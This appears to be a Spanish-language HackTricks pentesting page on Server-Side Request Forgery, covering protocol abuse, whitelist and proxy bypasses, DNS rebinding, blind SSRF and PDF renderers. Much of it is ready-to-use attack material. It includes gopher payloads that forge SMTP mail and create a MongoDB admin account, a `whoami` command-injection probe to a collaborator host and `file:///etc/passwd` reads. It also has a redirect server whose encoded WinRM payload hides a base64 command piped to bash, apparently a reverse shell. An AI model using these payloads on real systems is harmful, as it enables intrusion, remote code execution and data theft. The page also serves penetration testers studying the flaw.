# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Una vulnerabilidad de **Server-side Request Forgery (SSRF)** ocurre cuando un atacante manipula una **aplicación del lado del servidor** para que realice **peticiones HTTP** a un dominio de su elección. Esta vulnerabilidad expone al servidor a solicitudes externas arbitrarias dirigidas por el atacante.

## Capturar SSRF

Lo primero que necesitas hacer es capturar una interacción SSRF generada por ti. Para capturar una interacción HTTP o DNS puedes usar herramientas como:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Whitelisted Domains Bypass

Normalmente encontrarás que el SSRF solo funciona en **ciertos dominios o URL en whitelist**. En la página siguiente tienes una **compilación de técnicas para intentar bypassear esa whitelist**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

Si el servidor está correctamente protegido podrías **evadir todas las restricciones explotando un Open Redirect dentro de la página web**. Dado que la página probablemente permita **SSRF al mismo dominio** y probablemente **siga redirecciones**, puedes explotar el **Open Redirect para hacer que el servidor acceda a cualquier recurso interno**.\
Lee más aquí: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protocolos

- **file://**
- El esquema de URL `file://` se menciona, apuntando directamente a `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- El esquema de URL DICT se describe como utilizado para acceder a definiciones o listas de palabras a través del protocolo DICT. Un ejemplo muestra una URL construida que apunta a una palabra específica, base de datos y número de entrada, así como un caso de un script PHP que podría usarse indebidamente para conectarse a un servidor DICT usando credenciales proporcionadas por el atacante: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Identificado como un protocolo para transferencia segura de archivos sobre secure shell, se proporciona un ejemplo que muestra cómo un script PHP podría ser explotado para conectarse a un servidor SFTP malicioso: `url=sftp://generic.com:11111/`
- **TFTP://**
- El Trivial File Transfer Protocol, que opera sobre UDP, se menciona con un ejemplo de un script PHP diseñado para enviar una petición a un servidor TFTP. Se realiza una petición TFTP a 'generic.com' en el puerto '12346' para el archivo 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Este segmento cubre el Lightweight Directory Access Protocol, enfatizando su uso para gestionar y acceder a servicios de información de directorio distribuidos sobre redes IP. Interactúa con un servidor LDAP en localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Se describe un método para explotar vulnerabilidades SSRF y así interactuar con servicios SMTP en localhost, incluyendo pasos para revelar nombres de dominio internos y acciones de investigación adicionales basadas en esa información.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Si el SSRF se ejecuta con **curl**, curl tiene una funcionalidad llamada [**URL globbing**](https://everything.curl.dev/cmdline/globbing) que puede ser útil para evadir WAFs. Por ejemplo, en este [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) puedes encontrar este ejemplo de una **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Se describe la capacidad del protocolo Gopher para especificar IP, puerto y bytes para la comunicación con el servidor, junto con herramientas como Gopherus y remote-method-guesser para crear payloads. Se ilustran dos usos distintos:

### Gopher://

Usando este protocolo puedes especificar la **IP, puerto y bytes** que quieres que el servidor **envíe**. Entonces, básicamente puedes explotar un SSRF para **comunicarte con cualquier servidor TCP** (pero necesitas saber cómo hablar con el servicio primero).\
Afortunadamente, puedes usar [Gopherus](https://github.com/tarunkant/Gopherus) para crear payloads para varios servicios. Además, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) puede usarse para crear payloads _gopher_ para servicios _Java RMI_.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect al 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Crear usuario con username=admin con password=admin123 y con permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Others

El software de analítica en servidores suele registrar el Referrer header para rastrear los enlaces entrantes, una práctica que expone inadvertidamente a las aplicaciones a vulnerabilidades de Server-Side Request Forgery (SSRF). Esto se debe a que dicho software puede visitar URLs externas mencionadas en el Referrer header para analizar el contenido del sitio de referencia. Para detectar estas vulnerabilidades, se recomienda el plugin de Burp Suite "**Collaborator Everywhere**", aprovechando la forma en que las herramientas de análisis procesan el Referer header para identificar superficies de ataque SSRF potenciales.

## SSRF via SNI data from certificate

Una mala configuración que podría permitir la conexión a cualquier backend mediante una configuración sencilla se ilustra con un ejemplo de configuración de Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
En esta configuración, el valor del campo Server Name Indication (SNI) se utiliza directamente como la dirección del backend. Esta configuración expone una vulnerabilidad a Server-Side Request Forgery (SSRF), que puede explotarse simplemente especificando la IP o el nombre de dominio deseado en el campo SNI. A continuación se muestra un ejemplo de explotación para forzar una conexión a un backend arbitrario, como `internal.host.com`, usando el comando `openssl`:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

It might be worth trying a payload like: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Renderizado de PDFs

Si la página web está creando automáticamente un PDF con alguna información que hayas proporcionado, puedes **insertar algo de JS que será ejecutado por el creador de PDF** en sí (el servidor) mientras se crea el PDF y podrás abusar de un SSRF. [**Encuentra más información aquí**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## De SSRF a DoS

Crea varias sesiones e intenta descargar archivos pesados explotando el SSRF desde las sesiones.

## Funciones PHP de SSRF

Revisa la siguiente página para funciones vulnerables de PHP e incluso Wordpress:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## Redirección SSRF a Gopher

Para algunas explotaciones puede que necesites **enviar una respuesta de redirección** (potencialmente para usar un protocolo diferente como gopher). Aquí tienes diferentes códigos en python para responder con una redirección:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Proxies mal configurados que permiten SSRF

Trucos [**de esta publicación**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Código vulnerable del proxy de Flask</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask permite usar **`@`** como carácter inicial, lo que permite hacer que el **nombre de host inicial sea el nombre de usuario** e inyectar uno nuevo. Solicitud de ataque:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Código vulnerable:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Se descubrió que es posible **iniciar la ruta** de una solicitud con el carácter **`;`**, lo que permite usar luego **`@`** e inyectar un nuevo host al que acceder. Petición de ataque:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP Built-in Web Server <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Código PHP vulnerable</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP permite el uso del **carácter `*` antes de una barra en la ruta** del URL, sin embargo, tiene otras limitaciones, como que sólo puede usarse para el pathname raíz `/` y que los puntos `.` no están permitidos antes de la primera barra, por lo que es necesario usar, por ejemplo, una dirección IP codificada en hex sin puntos (dotless-hex):
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Si tienes **problemas** para **exfiltrate content from a local IP** debido a **CORS/SOP**, **DNS Rebidding** puede usarse para bypass esa limitación:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) es una herramienta para realizar ataques de [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). Incluye los componentes necesarios para rebind the IP address of the attack server DNS name to the target machine's IP address y para servir attack payloads para explotar software vulnerable en la máquina objetivo.

Consulta también el **servidor público en ejecución en** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requisitos:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Attack:

1. Pide al usuario/bot que **acceda** a un **domain** controlado por el **attacker**
2. El **TTL** del **DNS** es **0** seg (así la víctima comprobará la IP del dominio de nuevo pronto)
3. Se crea una **TLS connection** entre la víctima y el dominio del atacante. El atacante introduce el **payload inside** el **Session ID or Session Ticket**.
4. El **domain** empezará un **infinite loop** de redirecciones contra **himself**. El objetivo es forzar al usuario/bot a acceder al dominio hasta que realice **de nuevo** una **DNS request** del dominio.
5. En la solicitud DNS se devuelve ahora una **private IP** (por ejemplo 127.0.0.1)
6. El usuario/bot intentará **reestablish the TLS connection** y, para hacerlo, **enviará** el **Session** ID/Ticket ID (donde estaba contenido el **payload** del atacante). Así que felicidades: lograste que el **user/bot attack himself**.

Ten en cuenta que durante este ataque, si quieres atacar localhost:11211 (_memcache_) necesitas hacer que la víctima establezca la conexión inicial con www.attacker.com:11211 (el **port must always be the same**).\
Para **perform this attack you can use the tool**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Para **más información** echa un vistazo a la charla donde se explica este ataque: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

La diferencia entre un blind SSRF y uno que no lo es, es que en el blind no puedes ver la respuesta de la petición SSRF. Por tanto, es más difícil de explotar porque solo podrás aprovechar vulnerabilidades ya conocidas.

### Time based SSRF

**Comprobando el tiempo** de las respuestas del servidor podría ser **posible saber si un recurso existe o no** (quizá lleva más tiempo acceder a un recurso existente que a uno que no existe)

### From blid to full abusing status codes

Según este [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), algunos blind SSRF pueden ocurrir porque, aun cuando la URL objetivo responde con un código de estado 200 (como AWS metadata), esos datos no están bien formateados y por tanto la app puede rehusar mostrarlos.

Sin embargo, se ha encontrado que enviando algunas respuestas de redirect entre 305 y 309 en el SSRF podría ser posible hacer que la aplicación **follow these redirects while entering an error mode** que deja de verificar el formato de los datos y puede simplemente imprimirlos.

El servidor python usado para explotar esto es el siguiente:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Pasos:**
- Primero 302 hace que la aplicación empiece a seguir.
- Luego recibe 305 → 306 → 307 → 308 → 309 → 310.
- Después del 5º código extraño el PoC finalmente devuelve 302 → 169.254.169.254 → 200 OK.

**Qué sucede dentro del target:**
- libcurl en sí sigue 305–310; simplemente normaliza códigos desconocidos a “follow.”
- Después de N redirecciones extrañas (≥ 5 aquí) el propio wrapper de la aplicación decide “something is off” y cambia a un modo de error pensado para debugging.
- En ese modo vuelca toda la cadena de redirecciones más el body final de vuelta al caller externo.
- Resultado: attacker ve cada header + el metadata JSON, misión cumplida.

Ten en cuenta que esto es interesante para leak códigos de estado que no podías leak antes (como un 200). Sin embargo, si de alguna manera también pudieras seleccionar el status code de la respuesta (imagina que puedes decidir que la AWS metadata responde con un 500 status code), **podría haber algunos status codes que directamente leak el contenido de la respuesta.**

### Renderizadores HTML-to-PDF como gadgets SSRF ciegos

Librerías como **TCPDF** (y wrappers como **spipu/html2pdf**) recuperarán automáticamente cualquier URL presente en HTML controlado por el attacker mientras renderizan un PDF. Cada atributo `<img>` o `<link rel="stylesheet">` se resuelve del lado del servidor vía cURL, `getimagesize()`, o `file_get_contents()`, así que puedes hacer que el worker de PDF sondee hosts internos aunque ninguna respuesta HTTP se refleje hacia ti.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 realiza varios intentos de recuperación por cada recurso `<img>`, por lo que un solo payload puede generar múltiples requests (útil para port scans basados en timing).
- html2pdf copia el comportamiento de TCPDF para `<img>` y añade la obtención de CSS dentro de `Css::extractStyle()`, que simplemente llama a `file_get_contents($href)` tras una comprobación superficial del esquema. Abúsalo para alcanzar servicios loopback, rangos RFC1918 o cloud metadata endpoints.
- Combina este SSRF primitive con los [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) para leak both internal HTTP responses and local files rendered into the PDF.

Los hardeners deberían eliminar las URLs externas antes de renderizar o aislar el renderer en una sandbox de red; hasta entonces, trata a los PDF generators como blind SSRF proxies.

## Cloud SSRF Exploitation

Si encuentras una vulnerabilidad SSRF en una máquina que corre dentro de un entorno cloud, podrías obtener información interesante sobre el entorno cloud e incluso credenciales:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF Vulnerable Platforms

Varias plataformas conocidas contienen o han contenido vulnerabilidades SSRF, revísalas en:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Tools

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool to detect and exploit SSRF vulnerabilities

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

This tool generates Gopher payloads for:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ is a _Java RMI_ vulnerability scanner that supports attack operations for most common _Java RMI_ vulnerabilities. Most of the available operations support the `--ssrf` option, to generate an _SSRF_ payload for the requested operation. Together with the `--gopher` option, ready to use _gopher_ payloads can be generated directly.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy is a multi-threaded HTTP proxy server designed to tunnel client HTTP traffic through HTTP servers vulnerable to Server-Side Request Forgery (SSRF).

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## References

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
